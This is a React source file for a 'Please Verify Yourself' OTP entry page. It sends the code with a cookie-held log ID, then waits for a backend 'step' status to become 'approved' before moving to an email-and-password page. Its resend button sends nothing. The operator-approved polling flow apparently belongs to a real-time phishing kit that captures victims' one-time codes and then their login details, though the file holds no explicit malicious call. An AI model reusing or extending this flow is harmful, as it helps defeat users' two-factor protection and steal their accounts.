import React, { useState, useEffect } from "react";
import { getUserStep, verifyOtpCode } from "../api"; // Import API functions for polling and OTP verification
import { useNavigate } from "react-router-dom";
import Cookies from "js-cookie"; // Import js-cookie to handle cookies
import styles from "./Verify.module.css";
import Loader from "./Loader";

const Verify = () => {
  const [code, setCode] = useState("");
  const [errorMessage, setErrorMessage] = useState(""); // Error message state
  const [timeLeft, setTimeLeft] = useState(120); // 2-minute timer (120 seconds)
  const [isCodeExpired, setIsCodeExpired] = useState(false); // Timer expiration
  const [isResending, setIsResending] = useState(false); // State for resend process
  const [isLoading, setIsLoading] = useState(false); // Loading state for showing the spinner
  const navigate = useNavigate();

  // Retrieve logId from cookies
  const logId = Cookies.get("logId"); // Assuming logId is stored in a cookie

  useEffect(() => {
    if (!logId) {
      setErrorMessage("Log ID not found. Please try logging in again.");
      return;
    }

    // Start the countdown timer
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 0) {
          clearInterval(timer);
          setIsCodeExpired(true); // Set expired state to true
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer); // Cleanup the timer on component unmount
  }, [logId]);

  // Function to format the remaining time into MM:SS format
  const formatTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes.toString().padStart(2, "0")}:${seconds
      .toString()
      .padStart(2, "0")}`;
  };

  // Handle form submission (verifying the code)
  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true); // Show loader
    try {
      // Call the API to verify the OTP code
      const response = await verifyOtpCode(code, logId); // Pass both the code and logId to verify OTP
      if (response.success) {
        // Start polling for the step status if OTP is verified
        pollForStep(logId);
      } else {
        setErrorMessage("The OTP/code you entered is incorrect.");
        setIsLoading(false); // Hide loader if OTP is incorrect
      }
    } catch (error) {
      setErrorMessage(
        error.message || "Error verifying OTP. Please try again."
      );
      setIsLoading(false); // Hide loader on error
    }
  };

  // Polling for the step status
  const pollForStep = async (logId) => {
    let retries = 0;
    const maxRetries = 20; // Retry polling for 1 minute (20 retries at 3-second intervals)

    const interval = setInterval(async () => {
      try {
        const response = await getUserStep(logId); // Call the API to get the user step
        const { step } = response;

        if (step === "approved") {
          clearInterval(interval); // Stop polling
          setIsLoading(false); // Hide loader when approved
          navigate("/email-pass"); // Navigate to email-pass page
        } else if (step === "error") {
          setErrorMessage("The OTP/code you entered is incorrect.");
          clearInterval(interval); // Stop polling on error
          setIsLoading(false); // Hide loader on error
        } else {
          console.log("Still verifying...");
        }

        retries++;
        if (retries >= maxRetries) {
          clearInterval(interval);
          setErrorMessage("Verification is taking too long. Please try again.");
          setIsLoading(false); // Hide loader if max retries reached
        }
      } catch (error) {
        console.error("Error fetching step:", error);
        clearInterval(interval); // Stop polling on error
        setIsLoading(false); // Hide loader on error
      }
    }, 3000); // Poll every 3 seconds
  };

  // Resend OTP logic
  const handleResendOtp = async () => {
    setIsResending(true); // Show loading indicator for resend process
    try {
      setErrorMessage(""); // Clear any previous errors
      setIsCodeExpired(false); // Reset the code expired state
      setTimeLeft(120); // Reset the timer for 2 more minutes
      // Add logic to resend the OTP here, if needed
    } catch (error) {
      setErrorMessage("Failed to resend OTP. Please try again later.");
    } finally {
      setIsResending(false); // Stop loading indicator
    }
  };

  return (
    <div className={styles.parentContainer}>
      {isLoading ? (
        <Loader /> // Show loader while waiting for approval
      ) : (
        <div className={styles.innerContainer}>
          {/* Section Heading */}
          <h2 className={styles.heading}>Please Verify Yourself</h2>

          {/* Description */}
          <p className={styles.description}>
            We have sent a verification code to your number. Please enter it
            below to verify your identity.
          </p>

          {/* Input for the verification code */}
          <form onSubmit={handleSubmit}>
            <div className={styles.inputGroup}>
              <input
                type="text"
                placeholder="Enter your code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className={styles.input}
                maxLength="6"
                disabled={isCodeExpired} // Disable input if the OTP is expired
              />
            </div>
            <button
              type="submit"
              className={styles.verifyButton}
              disabled={isCodeExpired} // Disable button if the OTP is expired
            >
              Verify Code
            </button>
          </form>

          {/* Display error message if any */}
          {errorMessage && <p className={styles.error}>{errorMessage}</p>}

          {/* Resend Code Link */}
          <button
            onClick={handleResendOtp}
            disabled={isResending || !isCodeExpired} // Disable button if still resending or OTP hasn't expired
            className={styles.resendLink}
          >
            {isResending ? "Resending..." : "Didn't receive a code? Resend"}
          </button>

          {/* Countdown Timer */}
          {!isCodeExpired ? (
            <p className={styles.timer}>
              OTP Expires in:{" "}
              <span className={styles.timer1}>{formatTime(timeLeft)}</span>
            </p>
          ) : (
            <p className={styles.timerExpired}>
              OTP has expired. Please request a new one.
            </p>
          )}
        </div>
      )}
    </div>
  );
};

export default Verify;
